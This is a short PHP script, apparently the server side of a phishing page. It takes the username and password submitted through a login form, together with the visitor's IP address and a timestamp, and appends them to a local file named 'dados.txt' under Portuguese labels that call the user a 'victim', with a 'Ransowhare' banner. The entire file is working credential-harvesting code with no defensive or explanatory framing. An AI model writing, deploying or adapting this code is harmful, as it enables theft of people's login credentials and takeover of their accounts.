<?php

$ip = $_SERVER["REMOTE_ADDR"]."\r\n";
$hora = date("Y-m-d  #  H:i:s")."\r\n";
$username=$_POST['username']."\r\n";
$password=$_POST['password']."\r\n";

$traco="==============Ransowhare==============="."\r\n";
$seuip="IP: ";
$seuhora="HORA: ";
$seuemail="VITIMA: ";
$seusenha="Key:  ";

$file = fopen("dados.txt","a");
$escrever0=fwrite($file, $traco);
$escrever1=fwrite($file, $seuip);
$escrever2=fwrite($file, $ip);
$escrever3=fwrite($file, $seuhora);
$escrever4=fwrite($file, $hora);
$escrever5=fwrite($file, $seuemail);
$escrever6=fwrite($file, $username);
$escrever7=fwrite($file, $seusenha);
$escrever8=fwrite($file, $password);
fclose($file);
?>
